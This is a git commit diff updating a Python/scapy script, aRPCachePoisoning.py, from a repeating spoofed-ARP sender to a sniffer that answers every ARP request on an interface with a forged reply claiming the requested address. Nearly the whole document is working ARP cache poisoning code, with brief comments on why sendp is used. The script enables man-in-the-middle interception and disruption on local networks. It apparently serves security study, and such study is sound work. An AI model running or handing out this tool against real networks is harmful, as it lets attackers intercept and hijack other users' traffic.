0404cdbfbf376f0fb9800ab790fcabf1f40c5fca
Piotr Kiljanek <kiljanek2005@gmail.com>
2019-09-25 14:36:41 +0200

    Update aRPCachePoisoning.py

--- SEC/testConn/aRPCachePoisoning.py
+++ SEC/testConn/aRPCachePoisoning.py
@@ -1,26 +1,33 @@
 #!/usr/bin/python
 
-# In the ARP header we set the IP address of the victim (target_ip) 
-# and the IP which we would like to hijack all connections (fake_ip)
-
+# is-at, declares the packet as an ARP response.
+#
+# Its important to call the function sendp() and not the function send(), 
+# because the packet should be sent on layer 2. 
+# The function send() sends packets on layer 3.
 import sys
-import time
-from scapy.all import sendp, ARP, Ether
+from scapy.all import sniff, sendp, ARP, Ether
 
-if len(sys.argv) < 3:
-  print sys.argv[0] + ": <target> <spoof_ip>"
-  sys.exit(1)
+if len(sys.argv) < 2:
+  print sys.argv[0] + " <iface>"
+  sys.exit(0)
 
-iface = "eth0"
-target_ip = sys.argv[1]
-fake_ip = sys.argv[2]
+def arp_poison_callback(packet):
+  # Got ARP request?
+  if packet[ARP].op == 1:
+    answer = Ether(dst=packet[ARP].hwsrc) / ARP()
+    answer[ARP].op = "is-at"
+    answer[ARP].hwdst = packet[ARP].hwsrc
+    answer[ARP].psrc = packet[ARP].pdst
+    answer[ARP].pdst = packet[ARP].psrc
+    print "Fooling " + packet[ARP].psrc + " that " + \
+      packet[ARP].pdst + " is me"
+    sendp(answer, iface=sys.argv[1])
+    
+# The received packets are automatically filtered by the PCAP filter arp that guarantees that callback function
+# arp_poison_callback will only get called with ARP packets as input
 
-ethernet = Ether()
-arp = ARP(pdst=target_ip,
-  psrc=fake_ip,
-  op="is-at")
-
-packet = ethernet / arp
-while True:
-  sendp(packet, iface=iface)
-  time.sleep(10)
+sniff(prn=arp_poison_callback,
+      filter="arp",
+      iface=sys.argv[1],
+      store=0)
